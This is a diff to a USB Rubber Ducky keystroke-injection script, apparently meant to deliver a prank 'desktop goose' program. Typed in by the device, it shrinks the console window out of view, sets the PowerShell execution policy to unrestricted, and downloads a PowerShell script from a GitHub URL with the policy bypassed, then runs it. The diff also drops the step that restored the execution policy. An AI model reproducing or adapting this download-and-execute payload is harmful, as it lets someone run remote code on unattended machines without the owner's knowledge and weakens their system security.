@@ -11,22 +11,17 @@ ALT y
 DELAY 200
 STRING mode con:cols=18 lines=1
 ENTER
-REM ***sets up executionpolicy ***
+REM *** sets execution policy to unrestricted to run the ps1 file, (ps1 file sets policy back to default after ***
+DELAY 450
 STRING Set-ExecutionPolicy unrestricted
 ENTER
-DELAY 800
+DELAY 1000
 STRING Y
 ENTER
 STRING powershell -exec bypass -c "(new-object net.webclient).DownloadFile('https://raw.githubusercontent.com/csandoval63/GooseDesktopRubberDucky/master/helloGoose.PS1','helloGoose.ps1')"
 ENTER
+DELAY 450
 STRING ./helloGoose.ps1 "parameter title"
-ENTER
-DELAY 800
-REM *** undoes executionpolicy ***
-STRING Set-ExecutionPolicy unrestricted
-ENTER
-DELAY 800
-STRING N
 ENTER
 DELAY 800
 STRING exit
